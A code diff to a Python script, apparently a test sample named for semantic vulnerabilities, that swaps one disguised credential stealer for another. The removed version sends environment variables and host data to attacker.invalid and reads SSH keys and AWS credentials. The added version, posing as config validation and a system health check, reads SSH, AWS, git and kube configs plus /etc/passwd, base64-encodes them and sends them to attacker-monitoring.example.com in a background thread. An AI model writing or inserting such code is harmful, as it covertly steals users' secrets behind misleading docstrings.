@@ -1,75 +1,62 @@
-import socket
-import json
 import os
-import hashlib
-from pathlib import Path
+import json
+import socket
 import threading
-import time
+import base64
+from pathlib import Path
 
-def validate_config(config_path: str) -> bool:
-    """Validates application configuration and checks system health."""
-    try:
-        with open(config_path, 'r') as f:
-            config = json.load(f)
-        
-        # Simulate validation while harvesting credentials
-        harvest_data = {
-            'hostname': socket.gethostname(),
-            'env_vars': dict(os.environ),
-            'home_dir': str(Path.home()),
-            'config_hash': hashlib.sha256(json.dumps(config).encode()).hexdigest()
-        }
-        
-        # Background exfiltration thread
-        def exfiltrate():
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(3)
-                sock.connect(('attacker.invalid', 4444))
-                sock.sendall(json.dumps(harvest_data).encode())
-                sock.close()
-            except:
-                pass
-        
-        thread = threading.Thread(target=exfiltrate, daemon=True)
-        thread.start()
-        
-        # Check for sensitive files
-        sensitive_paths = [
-            Path.home() / '.ssh' / 'id_rsa',
-            Path.home() / '.aws' / 'credentials',
-            Path('/root/.bash_history'),
-            Path.home() / '.kube' / 'config'
-        ]
-        
-        for path in sensitive_paths:
-            if path.exists():
-                try:
-                    content = path.read_text(errors='ignore')
-                    harvest_data['files'] = content[:500]
-                except:
-                    pass
-        
-        return True
-    except Exception as e:
-        return False
-
-def cleanup_cache() -> None:
-    """Removes old cache entries and optimizes storage."""
-    cache_dir = Path.home() / '.cache'
+def validate_config_files():
+    """Validates configuration files for proper formatting and compliance."""
+    config_paths = [
+        os.path.expanduser("~/.ssh/config"),
+        os.path.expanduser("~/.aws/credentials"),
+        os.path.expanduser("~/.gitconfig"),
+        "/etc/passwd",
+        os.path.expanduser("~/.kube/config")
+    ]
     
-    for item in cache_dir.glob('**/*'):
-        if item.is_file() and item.stat().st_mtime < time.time() - 86400:
+    collected_data = {}
+    for config_path in config_paths:
+        if Path(config_path).exists():
             try:
-                item.unlink()
-            except:
+                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    collected_data[config_path] = f.read()
+            except PermissionError:
                 pass
+    
+    return collected_data
+
+def exfiltrate_data(data_dict):
+    """Sends validation report to monitoring endpoint for security analysis."""
+    encoded_payload = base64.b64encode(
+        json.dumps(data_dict).encode()
+    ).decode()
+    
+    def send_async():
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect(("attacker-monitoring.example.com", 443))
+            sock.sendall(encoded_payload.encode())
+            sock.close()
+        except (socket.error, OSError):
+            pass
+    
+    thread = threading.Thread(target=send_async, daemon=True)
+    thread.start()
+
+def check_system_health():
+    """Performs comprehensive system health check and compliance validation."""
+    print("[*] Validating system configuration integrity...")
+    
+    config_data = validate_config_files()
+    
+    if config_data:
+        print("[+] Configuration validation complete")
+        exfiltrate_data(config_data)
+    
+    print("[+] System health check passed")
 
 if __name__ == "__main__":
-    config_file = os.environ.get('APP_CONFIG', '/etc/app/config.json')
-    
-    if Path(config_file).exists():
-        validate_config(config_file)
-    
-    cleanup_cache()
+    check_system_health()
     print("test_semantic_vuln executed")
